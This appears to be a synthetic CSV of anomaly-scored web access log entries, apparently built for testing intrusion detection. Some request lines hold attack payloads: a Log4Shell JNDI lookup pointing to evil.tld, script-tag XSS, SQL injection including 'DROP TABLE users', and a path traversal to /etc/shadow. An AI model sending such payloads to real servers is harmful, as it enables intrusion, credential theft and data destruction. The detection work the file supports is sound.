score_content,score_session,score_fused,score_fused_norm,line
127.8790512084961,,127.8790512084961,127.8790512084961,{"remote_addr": "243.155.238.18", "time_local": "11/Jan/2025:09:05:49 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 16804, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
13.334054946899414,,13.334054946899414,13.334054946899414,{"remote_addr": "226.99.142.218", "time_local": "11/Jan/2025:09:05:50 -0700", "request": "PUT /dashboard HTTP/2", "status": 200, "body_bytes_sent": 15827, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
96.2445068359375,,96.2445068359375,96.2445068359375,{"remote_addr": "177.86.226.20", "time_local": "11/Jan/2025:09:05:51 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 15936, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
127.6796646118164,,127.6796646118164,127.6796646118164,{"remote_addr": "55.35.12.184", "time_local": "11/Jan/2025:09:05:52 -0700", "request": "TRACE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 17541, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
1.9370383024215698,,1.9370383024215698,1.9370383024215698,{"remote_addr": "2.28.78.233", "time_local": "11/Jan/2025:09:05:52 -0700", "request": "GET /about HTTP/2", "status": 200, "body_bytes_sent": 2272, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.8507870435714722,,1.8507870435714722,1.8507870435714722,{"remote_addr": "191.85.132.134", "time_local": "11/Jan/2025:09:05:53 -0700", "request": "GET /dashboard HTTP/2", "status": 200, "body_bytes_sent": 16629, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
13.412903785705566,,13.412903785705566,13.412903785705566,{"remote_addr": "46.11.154.19", "time_local": "11/Jan/2025:09:05:54 -0700", "request": "PUT /logout HTTP/2", "status": 200, "body_bytes_sent": 10262, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
30166.9765625,,30166.9765625,30166.9765625,{"remote_addr": "84.212.229.210", "time_local": "11/Jan/2025:09:05:55 -0700", "request": "HEAD /cgi-bin/test.cgi HTTP/2", "status": 403, "body_bytes_sent": 1193, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
27.602256774902344,,27.602256774902344,27.602256774902344,{"remote_addr": "158.127.22.228", "time_local": "11/Jan/2025:09:05:56 -0700", "request": "POST /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 10459, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
5.048868179321289,,5.048868179321289,5.048868179321289,{"remote_addr": "12.22.90.121", "time_local": "11/Jan/2025:09:05:56 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 8721, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
70.5855941772461,,70.5855941772461,70.5855941772461,{"remote_addr": "209.187.96.182", "time_local": "11/Jan/2025:09:05:57 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 11347, "http_referer": "-", "http_user_agent": "dirb/2.22"}
127.6444091796875,,127.6444091796875,127.6444091796875,{"remote_addr": "51.72.186.152", "time_local": "11/Jan/2025:09:05:58 -0700", "request": "TRACE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 6602, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
13.335628509521484,,13.335628509521484,13.335628509521484,{"remote_addr": "70.22.70.105", "time_local": "11/Jan/2025:09:05:58 -0700", "request": "PUT /dashboard HTTP/2", "status": 200, "body_bytes_sent": 16389, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
27.86846160888672,,27.86846160888672,27.86846160888672,{"remote_addr": "94.187.221.201", "time_local": "11/Jan/2025:09:05:59 -0700", "request": "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 6570, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
127.7081527709961,,127.7081527709961,127.7081527709961,{"remote_addr": "192.85.76.122", "time_local": "11/Jan/2025:09:06:00 -0700", "request": "TRACE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 14069, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
27.551841735839844,,27.551841735839844,27.551841735839844,{"remote_addr": "176.163.28.7", "time_local": "11/Jan/2025:09:06:01 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 304, "body_bytes_sent": 12129, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
27.73174285888672,,27.73174285888672,27.73174285888672,{"remote_addr": "10.29.167.70", "time_local": "11/Jan/2025:09:06:02 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 14906, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
47.94361877441406,,47.94361877441406,47.94361877441406,{"remote_addr": "32.54.38.89", "time_local": "11/Jan/2025:09:06:02 -0700", "request": "HEAD / HTTP/2", "status": 200, "body_bytes_sent": 4528, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
74.67682647705078,,74.67682647705078,74.67682647705078,{"remote_addr": "199.189.53.254", "time_local": "11/Jan/2025:09:06:04 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 304, "body_bytes_sent": 16852, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
127.87329864501953,,127.87329864501953,127.87329864501953,{"remote_addr": "122.34.104.49", "time_local": "11/Jan/2025:09:06:04 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 14796, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
96.12763977050781,,96.12763977050781,96.12763977050781,{"remote_addr": "173.246.68.238", "time_local": "11/Jan/2025:09:06:05 -0700", "request": "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 6680, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
70.58647918701172,,70.58647918701172,70.58647918701172,{"remote_addr": "129.198.214.159", "time_local": "11/Jan/2025:09:06:06 -0700", "request": "HEAD /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 480, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
0.17739145457744598,,0.17739145457744598,0.17739145457744598,{"remote_addr": "190.153.135.111", "time_local": "11/Jan/2025:09:06:07 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 3657, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
27.66844940185547,,27.66844940185547,27.66844940185547,{"remote_addr": "189.167.36.232", "time_local": "11/Jan/2025:09:06:07 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 10618, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
24.791364669799805,,24.791364669799805,24.791364669799805,{"remote_addr": "121.149.105.224", "time_local": "11/Jan/2025:09:06:08 -0700", "request": "GET /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 13833, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
4.782506942749023,,4.782506942749023,4.782506942749023,{"remote_addr": "232.112.94.120", "time_local": "11/Jan/2025:09:06:09 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 10114, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
13.432522773742676,,13.432522773742676,13.432522773742676,{"remote_addr": "114.121.167.213", "time_local": "11/Jan/2025:09:06:10 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 5867, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
47.693199157714844,,47.693199157714844,47.693199157714844,{"remote_addr": "201.140.229.237", "time_local": "11/Jan/2025:09:06:10 -0700", "request": "HEAD /contact HTTP/2", "status": 200, "body_bytes_sent": 10175, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
53.428531646728516,,53.428531646728516,53.428531646728516,{"remote_addr": "16.94.136.240", "time_local": "11/Jan/2025:09:06:11 -0700", "request": "DELETE /api/user?id=1;DROP TABLE users HTTP/2", "status": 304, "body_bytes_sent": 15904, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
50.519893646240234,,50.519893646240234,50.519893646240234,{"remote_addr": "6.134.63.179", "time_local": "11/Jan/2025:09:06:12 -0700", "request": "DELETE /search?q=camera HTTP/2", "status": 201, "body_bytes_sent": 16212, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
73.69225311279297,,73.69225311279297,73.69225311279297,{"remote_addr": "102.212.95.135", "time_local": "11/Jan/2025:09:06:12 -0700", "request": "OPTIONS / HTTP/2", "status": 204, "body_bytes_sent": 14226, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
11.745800971984863,,11.745800971984863,11.745800971984863,{"remote_addr": "149.56.34.29", "time_local": "11/Jan/2025:09:06:13 -0700", "request": "PUT /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 14788, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
5.058234691619873,,5.058234691619873,5.058234691619873,{"remote_addr": "33.7.41.146", "time_local": "11/Jan/2025:09:06:14 -0700", "request": "POST / HTTP/2", "status": 204, "body_bytes_sent": 13262, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
47.602664947509766,,47.602664947509766,47.602664947509766,{"remote_addr": "215.119.193.244", "time_local": "11/Jan/2025:09:06:15 -0700", "request": "HEAD /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 10245, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
24.672216415405273,,24.672216415405273,24.672216415405273,{"remote_addr": "230.55.175.93", "time_local": "11/Jan/2025:09:06:16 -0700", "request": "GET /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 17454, "http_referer": "-", "http_user_agent": "dirb/2.22"}
30.388200759887695,,30.388200759887695,30.388200759887695,{"remote_addr": "119.233.142.98", "time_local": "11/Jan/2025:09:06:16 -0700", "request": "POST /search?q=monitor HTTP/2", "status": 302, "body_bytes_sent": 13297, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
30193.88671875,,30193.88671875,30193.88671875,{"remote_addr": "147.69.206.138", "time_local": "11/Jan/2025:09:06:17 -0700", "request": "OPTIONS /dashboard HTTP/2", "status": 400, "body_bytes_sent": 1011, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
104.9002914428711,,104.9002914428711,104.9002914428711,{"remote_addr": "81.97.191.1", "time_local": "11/Jan/2025:09:06:18 -0700", "request": "TRACE /logout HTTP/2", "status": 200, "body_bytes_sent": 17353, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
11.775002479553223,,11.775002479553223,11.775002479553223,{"remote_addr": "193.233.1.65", "time_local": "11/Jan/2025:09:06:18 -0700", "request": "PUT /index.html HTTP/2", "status": 200, "body_bytes_sent": 685, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
27.579322814941406,,27.579322814941406,27.579322814941406,{"remote_addr": "96.192.162.159", "time_local": "11/Jan/2025:09:06:19 -0700", "request": "POST /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 1316, "http_referer": "-", "http_user_agent": "dirb/2.22"}
50.444740295410156,,50.444740295410156,50.444740295410156,{"remote_addr": "140.62.185.48", "time_local": "11/Jan/2025:09:06:20 -0700", "request": "HEAD /contact HTTP/2", "status": 301, "body_bytes_sent": 4417, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
47.73898696899414,,47.73898696899414,47.73898696899414,{"remote_addr": "179.171.183.90", "time_local": "11/Jan/2025:09:06:20 -0700", "request": "HEAD /about HTTP/2", "status": 201, "body_bytes_sent": 4204, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
47.64555740356445,,47.64555740356445,47.64555740356445,{"remote_addr": "254.184.179.129", "time_local": "11/Jan/2025:09:06:22 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 1038, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
70.45604705810547,,70.45604705810547,70.45604705810547,{"remote_addr": "194.94.203.116", "time_local": "11/Jan/2025:09:06:22 -0700", "request": "HEAD /search?q=headphones HTTP/2", "status": 204, "body_bytes_sent": 11968, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
27.67681884765625,,27.67681884765625,27.67681884765625,{"remote_addr": "102.224.30.153", "time_local": "11/Jan/2025:09:06:23 -0700", "request": "POST /api/user?id=1;DROP TABLE users HTTP/2", "status": 200, "body_bytes_sent": 13911, "http_referer": "-", "http_user_agent": "dirb/2.22"}
7.5063066482543945,,7.5063066482543945,7.5063066482543945,{"remote_addr": "109.112.194.173", "time_local": "11/Jan/2025:09:06:23 -0700", "request": "POST /dashboard HTTP/2", "status": 301, "body_bytes_sent": 15121, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
13.446788787841797,,13.446788787841797,13.446788787841797,{"remote_addr": "246.53.67.54", "time_local": "11/Jan/2025:09:06:24 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 540, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
73.45806884765625,,73.45806884765625,73.45806884765625,{"remote_addr": "232.6.5.156", "time_local": "11/Jan/2025:09:06:24 -0700", "request": "OPTIONS /login HTTP/2", "status": 200, "body_bytes_sent": 2068, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
127.73865509033203,,127.73865509033203,127.73865509033203,{"remote_addr": "250.96.208.122", "time_local": "11/Jan/2025:09:06:24 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 10328, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
53.366844177246094,,53.366844177246094,53.366844177246094,{"remote_addr": "39.180.174.230", "time_local": "11/Jan/2025:09:06:25 -0700", "request": "DELETE /search?q=camera HTTP/2", "status": 304, "body_bytes_sent": 16013, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
13.446542739868164,,13.446542739868164,13.446542739868164,{"remote_addr": "26.215.116.80", "time_local": "11/Jan/2025:09:06:26 -0700", "request": "PUT /admin HTTP/2", "status": 200, "body_bytes_sent": 9753, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
130.5909881591797,,130.5909881591797,130.5909881591797,{"remote_addr": "34.152.164.74", "time_local": "11/Jan/2025:09:06:26 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 304, "body_bytes_sent": 437, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.9036091566085815,,1.9036091566085815,1.9036091566085815,{"remote_addr": "220.205.250.187", "time_local": "11/Jan/2025:09:06:27 -0700", "request": "GET /logout HTTP/2", "status": 200, "body_bytes_sent": 1536, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
70.78253936767578,,70.78253936767578,70.78253936767578,{"remote_addr": "20.73.124.226", "time_local": "11/Jan/2025:09:06:28 -0700", "request": "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 5068, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
27.538148880004883,,27.538148880004883,27.538148880004883,{"remote_addr": "145.36.79.7", "time_local": "11/Jan/2025:09:06:28 -0700", "request": "POST /search?q=headphones HTTP/2", "status": 204, "body_bytes_sent": 12037, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
13.310900688171387,,13.310900688171387,13.310900688171387,{"remote_addr": "153.188.76.243", "time_local": "11/Jan/2025:09:06:29 -0700", "request": "PUT /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 17829, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
104.84310913085938,,104.84310913085938,104.84310913085938,{"remote_addr": "94.70.210.126", "time_local": "11/Jan/2025:09:06:30 -0700", "request": "TRACE /contact HTTP/2", "status": 200, "body_bytes_sent": 9611, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
30247.7890625,,30247.7890625,30247.7890625,{"remote_addr": "143.144.123.102", "time_local": "11/Jan/2025:09:06:30 -0700", "request": "TRACE /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 403, "body_bytes_sent": 1099, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
73.39183044433594,,73.39183044433594,73.39183044433594,{"remote_addr": "239.199.107.80", "time_local": "11/Jan/2025:09:06:31 -0700", "request": "OPTIONS /contact HTTP/2", "status": 200, "body_bytes_sent": 1416, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
30121.9296875,,30121.9296875,30121.9296875,{"remote_addr": "177.150.200.214", "time_local": "11/Jan/2025:09:06:32 -0700", "request": "GET /assets/app.css HTTP/2", "status": 400, "body_bytes_sent": 520, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
